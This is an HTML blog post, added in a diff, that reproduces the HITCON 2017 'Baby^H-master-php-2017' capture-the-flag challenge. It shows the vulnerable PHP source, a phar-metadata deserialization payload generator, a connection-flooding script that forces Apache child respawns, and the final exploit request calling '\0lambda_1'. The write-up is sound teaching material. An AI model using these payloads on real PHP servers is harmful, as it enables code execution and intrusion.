@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>[hitcon2017] Baby^H-master-php-2017 复现 | Pr0ph3t's blog</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-69613510-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+    <link rel="shortcut icon" href="/assets/images/favicon.png">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <h1 class="">Pr0ph3t</h1>
+    <p>
+    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"Pr0ph3t"</span>;
+    </p>
+    <p>
+    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
+    </p>
+    <p>
+    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
+    </p>
+    <!-- <p>
+            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
+        </p> -->
+    <p>
+    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
+    </p>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">home</a></li>
+          <li><a href="/articles/">articles</a></li>
+          <li><a href="/friendlink">friends</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>[hitcon2017] Baby^H-master-php-2017 复现</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Jan 26, 2018
+        
+        
+        •
+        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#hitcon" class="reserved">hitcon</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <p>分享本题自制Dockerfile : <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p>
+
+<p>这题在比赛过程是0解......真的太难了...体现了Orange大大对php和中间件的深刻理解Orz 膜拜</p>
+
+<p>题目源码:</p>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$FLAG</span> <span class="o">=</span> <span class="nb">create_function</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="s1">'die(`/read_flag`);'</span><span class="p">);</span>
+<span class="nv">$SECRET</span> <span class="o">=</span> <span class="sb">`/read_secret`</span><span class="p">;</span>
+<span class="nv">$SANDBOX</span> <span class="o">=</span> <span class="s2">"/var/www/data/"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span>
+<span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"session-data"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">));</span>
+    <span class="nv">$hmac</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">"sha1"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$SECRET</span><span class="p">);</span>
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"session-data"</span><span class="p">,</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%s-----%s"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kd">class</span> <span class="nc">User</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$avatar</span><span class="p">;</span>
+    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">avatar</span> <span class="o">=</span> <span class="nv">$path</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">#######################key class################################</span>
+<span class="kd">class</span> <span class="nc">Admin</span> <span class="k">extends</span> <span class="nx">User</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$random</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
+        <span class="k">eval</span><span class="p">(</span><span class="s2">"function my_function_</span><span class="nv">$random</span><span class="s2">() {"</span>
+            <span class="o">.</span> <span class="s2">"  global </span><span class="se">\$</span><span class="s2">FLAG; </span><span class="se">\$</span><span class="s2">FLAG();"</span>
+            <span class="o">.</span> <span class="s2">"}"</span><span class="p">);</span>
+        <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"lucky"</span><span class="p">]();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">#######################key class################################</span>
+<span class="k">function</span> <span class="nf">check_session</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$SECRET</span><span class="p">;</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"session-data"</span><span class="p">];</span>
+    <span class="k">list</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"-----"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">#从cookie中取出data和hmac签名</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$hmac</span><span class="p">))</span> <span class="c1">#判空</span>
+    <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Bye"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">hash_equals</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">"sha1"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$SECRET</span><span class="p">),</span> <span class="nv">$hmac</span><span class="p">))</span> <span class="c1">#判断data加密之后和hmac签名是否对应</span>
+    <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Bye Bye"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">#反序列化</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="o">-&gt;</span><span class="na">avatar</span><span class="p">))</span> <span class="c1">#如果反序列化之后的data包含的类中无avatar成员,退出</span>
+    <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Bye Bye Bye"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">avatar</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">upload</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">"GIF89a"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"Fuck off"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"Upload OK"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">show</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"/var/www/html"</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: image/gif"</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="nv">$mode</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"m"</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s2">"upload"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">upload</span><span class="p">(</span><span class="nx">check_session</span><span class="p">());</span> <span class="c1">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s2">"show"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">show</span><span class="p">(</span><span class="nx">check_session</span><span class="p">());</span> <span class="c1">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>思路:<br>
+- 首先分析代码, 首先分配了一个匿名函数给flag变量, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个匿名函数<br>
+- 题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif<br>
+- 一开始的想法是 -----&gt; admin是关键类,需要通过反序列化之后的析构函数去触发其中的eval -----&gt; 通过lucky参数去调用这个输出flag的函数. 而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 基本上无法伪造.....所以放弃这个想法<br>
+- 咋一看好像代码里面并没有其他能够反序列化的地方了, 然后就来到了本题的第一个考点--php中解析Phar归档中的Metadata的时候可能会有反序列化的操作, 文档中描述的Phar::getMetadata操作(<a href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</p>
+
+<blockquote>
+<ul>
+<li>Phar?(方便开发者打包和发布php应用的类似于Java中的Jar的一种文件)
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/1.png" alt="What is Phar?(官方文档)"></li>
+<li>Phar归档的结构
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/2.png" alt="Phar(官方文档)"></li>
+<li>Metadata : Phar归档中可用来描述此文档的一段序列化之后的字符串<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/3.png" alt="usage of Metadata(官方文档)"></li>
+<li>phar_parse_metadata的初始化调用, 具体PHP源码在ext/phar/phar.c
+执行流程大致为: 
+....--&gt; phar_open_from_filename(1512行的php_stream_open_wrapper函数可以得知此函数处理phar://打开本地phar文件 1531行调用下一个函数)<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/4.png" alt="phar_open_from_filename">
+--&gt; phar_open_from_fp(1727行调用下一个函数)
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/5.png" alt="phar_open_from_fp">
+--&gt; phar_parse_pharfile(1038、1122行调用下一个函数)
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/6.png" alt="1038行">
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/7.png" alt="1122行">
+--&gt; phar_parse_metadata(函数在609行)
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/8.png" alt="phar_parse_metadata函数"></li>
+</ul>
+</blockquote>
+
+<ul>
+<li>而且题目内upload操作提供了<code class="prettyprint">file_get_content()</code>函数 其中地址可控,可以利用<code class="prettyprint">phar://</code>协议读取本地phar文件(phar协议不支持远程文件<a href="http://php.net/manual/zh/phar.using.stream.php">The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.
+</a>),也就是说只要构造一个phar利用upload写到服务器目录, 其中metadata设置为Admin对象,就可以进入Admin的析构函数了</li>
+<li>接下来的问题就是如何猜出那个随机数?
+答案是基本上猜不出来<a href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes是加密级别的伪随机数生成器<a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> 这是题目第二个死胡同</li>
+<li>然后就到了题目的第二个考点, 匿名函数其实是有真正的名字 从注册匿名函数的源码(Zend/zend_builtin_functions.c 1854行) 大佬还对这个逻辑戏谑了一番 <img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/9.png" alt="anonymous_functions_has_name">
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/10.png" alt="name_of_anonymous_functions">
+首先名字第一个字符被替换成了\0,也就是空字符 ,然后do操作将lambda_%d中的%d格式化成匿名函数的个数+1(从1开始)
+所以最后得出的匿名函数的真正名字为:\0lambda_%d(%d格式化为当前进程的第n个匿名函数)</li>
+<li>但是我们并不能知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数; 最后就引出了最后一个考点, Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求(这里猜测Orange大大应该修改了默认的0,因为0为永不kill掉子进程 这样就无法kill掉旧进程fork新进程了) 在这个新进程里面匿名函数就会是从1开始的了</li>
+</ul>
+
+<p>最后步骤分别是:<br>
+1. 先生成符合要求的phar放入自己的vps中, 生成代码为</p>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">Admin</span><span class="p">{</span>
+ <span class="k">public</span> <span class="nv">$avatar</span> <span class="o">=</span> <span class="s1">'xxx'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="nx">__DIR__</span><span class="o">.</span><span class="s1">'/avatar.phar'</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$p</span><span class="p">[</span><span class="s1">'file.php'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'&lt;?php ?&gt;'</span><span class="p">;</span>
+<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="k">new</span> <span class="nx">Admin</span><span class="p">());</span>
+<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
+<span class="nb">rename</span><span class="p">(</span><span class="nx">__DIR__</span><span class="o">.</span><span class="s1">'/avatar.phar'</span><span class="p">,</span><span class="nx">__DIR__</span><span class="o">.</span><span class="s1">'/avatar.gif'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<ol>
+<li>再请求<code class="prettyprint">?m=upload&amp;url=http://xxx.xxx.xxx.xxx</code></li>
+<li>启动Orange大大写的fork脚本</li>
+</ol>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># coding: UTF-8
+# Author: orange@chroot.org
+# 
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">multiprocessing.dummy</span> <span class="kn">import</span> <span class="n">Pool</span> <span class="k">as</span> <span class="n">ThreadPool</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">HOST</span> <span class="o">=</span> <span class="s">'127.0.0.1'</span>
+        <span class="n">PORT</span> <span class="o">=</span> <span class="mi">12344</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="s">'GET / HTTP/1.1</span><span class="se">\n</span><span class="s">Host: 127.0.0.1</span><span class="se">\n</span><span class="s">Connection: Keep-Alive</span><span class="se">\n\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="c1"># s.close()
+</span>        <span class="k">print</span> <span class="s">'ok'</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="mi">8</span>
+<span class="n">pool</span> <span class="o">=</span> <span class="n">ThreadPool</span><span class="p">(</span> <span class="n">i</span> <span class="p">)</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="n">map_async</span><span class="p">(</span> <span class="n">run</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
+</code></pre></div>
+<ol>
+<li>请求<code class="prettyprint">?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1</code>得到flag
+<img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/11.png" alt="flag"></li>
+</ol>
+
+<p>参考:<br>
+<a href="https://github.com/orangetw/My-CTF-Web-Challenges">https://github.com/orangetw/My-CTF-Web-Challenges</a><br>
+P神的小秘圈分享<br>
+<a href="http://php.net/manual/zh/book.phar.php">http://php.net/manual/zh/book.phar.php</a><br>
+<a href="http://blog.jobbole.com/91920/">http://blog.jobbole.com/91920/</a><br>
+<a href="https://yq.aliyun.com/ziliao/55320">https://yq.aliyun.com/ziliao/55320</a><br>
+<a href="https://www.zhihu.com/question/23786410">https://www.zhihu.com/question/23786410</a></p>
+
+  </article>
+
+	<p class="feed-recomendation">
+		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
+	</p>
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'pr0ph3t';
+    var disqus_config = function () {
+        this.page.identifier = "/posts/hitcon2017-Baby-H-master-php-2017-%E5%A4%8D%E7%8E%B0/";
+    };
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      Thx!
+    </footer>
+  </div>
+</div>
+<script src="//code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function() {
+	$("img").each(function() {
+		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+		$(this).wrapAll(strA);
+    });
+});
+</script>
+<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->
+
+      </div>
+    </body>
+</html>
